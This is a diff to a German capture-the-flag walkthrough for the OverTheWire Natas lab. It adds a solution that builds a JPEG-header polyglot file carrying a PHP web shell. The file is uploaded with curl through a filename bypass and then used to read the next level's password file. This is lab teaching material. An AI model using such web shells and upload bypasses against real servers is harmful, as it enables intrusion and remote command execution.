@@ -1062,9 +1062,151 @@ URL:        http://natas12.natas.labs.overthewire.org
 <details>
     <summary>Lösung</summary>
 
+Mit `natas12` erhältst du die Challenge, eine Schwachstelle im Bereich der unsicheren Datei-Uploads (**Unrestricted File Upload**) auszunutzen. Diese Schwachstelle erlaubt es Angreifern, ausführbare Dateien hochzuladen, indem sie serverseitige Validierungen umgehen. Es handelt sich hierbei um einen Datei-Upload-Bypass.
+
+Das Verfahren wird in diesem Level verdeutlicht. 
+
+Nachdem du dich eingeloggt und auf der Upload-Seite der Webanwendung bist, wird dir die Möglichkeit gewährt, eine Datei hochzuladen.
+
+Über `view source code` (normalerweise erreichbar über die Entwicklertools des Browsers) gelangst du hinter den Source-Code der PHP-Anwendung.
+
+Der Source-Code hat mehrere Funktionen, die ausgelöst werden, wenn A. die Seite lädt (z.B. `genRandomString()`) und B. bei Upload einer Datei.
+
+
+<details>
+    <summary>Source-Code ansehen:</summary>
+    
+![natas12 Source-Code](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13b.png)
+
 </details>
 
-----
+
+**Serverseitige Validierungen**
+
+Die Anwendung führt beim Upload mehrere Prüfungen durch, die umgangen werden müssen:
+
+- **Dateigröße:** Die hochgeladene Datei muss kleiner als `1000 Bytes` sein, bevor die Fehlermeldung "`File is too big`" ausgegeben wird.
+
+- **Dateiname (Endungsprüfung):** Die serverseitige Logik generiert einen zufälligen String und hängt die Endung (`.jpg` oder `.jpeg`) an, z.B. über Funktionen wie `pathinfo()`. Du musst diese Prüfung überlisten, um eine ausführbare Endung zu speichern.
+
+- **Dateisignatur (Inhaltsprüfung):** Der Server prüft wahrscheinlich, ob die Datei einen gültigen Header (bekannt als **Magic Bytes** oder **File Signature**) für ein Bildformat enthält, bevor er sie speichert.
+
+Es reicht nicht, eine normale `.jpeg`-Datei hochzuladen. Du musst eine sogenannte Polyglot-Datei erstellen, die den Header eines gültigen `JPEG`-Formats enthält, sowie einen `PHP`-Befehl, mit dem du Shell-Befehle auf dem Server ausführen kannst.
+
+Unter [WikiPedia: List of File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) erhältst du die Signaturen, die für die Dateien bestimmt sind - auch bekannt unter `magic numbers`. 
+
+Es gibt zwei Möglichkeiten:
+- Entweder du hast oder lädst dir eine `JPEG`-Datei herunter, in die du dann deinen `PHP`-Schadcode hinzufügst.
+- Oder du erstellst die Datei komplett neu mit den unter `Kali Linux` zur Verfügung stehenden Programmen.
+
+Ich zeige dir letzteres.
+
+**1. Datei für File Inclusion erstellen**
+
+Um ein Bild mit dem `JPEG`-Header zu deklarieren, eine Datei mit einem `PHP`-Payload zu erstellen und die beiden Dateien zu einer `JPEG`-Datei zu kombinieren, gibst du folgendes in dein Terminal ein:
+
+```bash
+# 1. Binären JPEG-Header (FF D8 FF E0) in eine temporäre Datei umleiten
+echo -n "FFD8FFE0" | xxd -r -p > image_header.bin
+
+# 2. PHP Payload erstellen
+# Die Funktion system($_GET["cmd"]) erlaubt das Ausführen von Befehlen über den URL-Parameter 'cmd'.
+echo '<?php system($_GET["cmd"]); ?>' > payload.txt
+
+# 3. Polyglot-Datei erstellen (Header + Payload)
+# Die Endung (.jpeg) wird hier nur als Platzhalter verwendet, der Bypass erfolgt später im cURL-Befehl.
+cat image_header.bin payload.txt > final_exploit.jpeg
+```
+
+**Erläuterung oben stehender Befehle:**     
+1. `echo -n "FFD8FFE0" | xxd -r -p > dateiname.bin`
+    - `echo -n "FFD8FFE0"`: Gibt den Hex-String des `JPEG`-Headers aus, wobei `-n` das abschließende Zeilenumbruchzeichen verhindert.
+    - `| xxd -r -p > dateiname.bin`: Die Pipe leitet den String an das `xxd`-Programm weiter, `-r` (Reverse) konvertiert den Hex-String in binäre Bytes, und `-p` (Plain) entfernt die Metadaten von `xxd`.
+
+2. `echo '<?php system($_GET["cmd"]); ?>' > payload.txt`
+    - Leitet den `PHP`-Web-Shell-Payload in eine Textdatei.
+    - `system($_GET["cmd"])`: Führt einen über den URL-Parameter `cmd`übergebenen Shell-Befehl aus.
+
+3. `cat image.bin payload.txt > finalImage.jpeg`
+    - `cat` verkettet die binären Header-Bytes (für die Signaturprüfung) und den Text-Payload (für die Code-Ausführung) und speichert das Ergebnis.
+
+![Natas13 - Datei vorbereiten](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13d.png)
+
+**2. Datei hochladen und Pfad manipulieren**
+
+Am einfachsten ist es, die Datei mit dem `cURL`-Befehl auf den Server hochzuladen. Beim Upload sind auf folgenden Dinge zu achten:
+
+- Die Header müssen mit dem Source-Code übereinstimmen.
+    - Wenn im Input steht: `<input type="text" name="UploadFile" ...>`, dann muss bei Dateiupload mit `cURL` dieser String exakt verwenden werden (`-F "UploadFile=...").
+- Du lädst auf die `index.php`-Seite, die den Upload bereitstellt.
+
+Lade die Datei mit folgendem Befehl hoch:
+
+```bash
+# Beispiel-Befehl für den Trailing-Slash-Bypass
+curl -u natas12:passwort \
+-F "uploadedfile=@final_exploit.jpeg;type=image/jpeg" \
+-F "filename=command.php/" -F "submit=Upload File" \
+http://natas12.natas.labs.overthewire.org/index.php
+```
+**Erläuterung des Bypasses**   
+**(`-F "filename=command.php/"`):** Dieser Schritt nutzt einen Fehler in der PHP-Funktion `pathinfo()` (die zur Endungsprüfung verwendet wird) und/oder im Betriebssystem.
+- **Validierung:** Die Funktion `pathinfo()` liest die Endung aufgrund des abschließenden Schrägstrichs (`/`) möglicherweise nicht korrekt oder die Prüfung ignoriert den Slash, was den Upload erlaubt.
+- **Speicherung:** Das Dateisystem (unter der `move_uploaded_file()`-Funktion) behandelt den Schrägstrich oft als ungültig und speichert die Datei als `randomString.php` (oder `randomString.phtml`), was die Ausführung ermöglicht.
+
+
+**Wichtig:** Der Dateipfand muss entweder relativ oder absolut angegeben werden, wenn die Datei nicht im gleichen Verzeichnis liegt. Achte deshalb darauf, das alles nach `-F "uploadfile=@` muss so angegeben ist, dass das `cURL`-Programm diese Datei finden kann.
+
+**Ein erfolgreicher Upload gibt dir im Terminalfenster folgendes aus:**   
+![Natas13 - Dateiupload via cURL-Befehl](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13e.png)
+
+Die hochgeladene Datei im Link (rotes Rechteck) kann weiterhin `.jpg` oder eine harmlose Endung sein, da diese vom Server zurückgegeben wird. **Die tatsächliche Endung auf dem Server ist jedoch `.php` (oder eine ähnliche ausführbare Endung) aufgrund des Bypasses.**
+
+Durch den `cURL`-Befehl wurde der Server so manipuliert, dass er die Dateiendung aus dem `cURL`-Befehl `.php` akzeptiert. 
+
+Im letzten Schritt ist es nur noch eine Frage des richtigen `cURL`-Befehls, damit du die richtige Datei ausliest, um an das Passwort von `natas13` zu kommen.
+
+**3. Auslesen des Passworts**
+
+Da der Server die Datei als `.php` akzeptiert, obwohl sie eine `JPEG`-Signatur trägt, kannst du diese Schwachstelle für dich nutzen, um deinen Payload entweder im Browser oder per weiteren `cURL`-Befehl mit einem `cmd=...`-Parameter zu übermitteln. 
+
+**Per `cURL`:**
+```bash
+curl -u natas12:passwort \
+http://natas12.natas.labs.overthewire.org/upload/dateipfad.php?cmd=cat%20/etc/natas_webpass/natas13
+```
+
+**Über den Browser:**
+```http
+natas12.labs.overthewire.org/upload/dateipfad.php?cmd=cat%20/etc/natas_webpass/natas13
+```
+
+![Natas13 - Passwort auslesen via Payload](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13f.png)
+
+
+Damit hast du das Passwort für `natas13` und kannst mit dem nächsten Level fortfahren.
+
+
+</details>
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
+## Natas 13 -> 14
+
+Username:   natas13
+
+URL:        http://natas13.natas.labs.overthewire.org
+
+<details>
+    <summary>Lösung</summary>
+
+</details>
 
 # Wird laufend fortgesetzt, bis das letzte Level geschafft ist.
 
@@ -1090,7 +1232,7 @@ Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und
 
 Stay curious – stay secure. 🔐
 
-🗓️ **Letzte Aktualisierung:** Oktober 2025  
+🗓️ **Letzte Aktualisierung:** November 2025  
 🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!
 
 ---
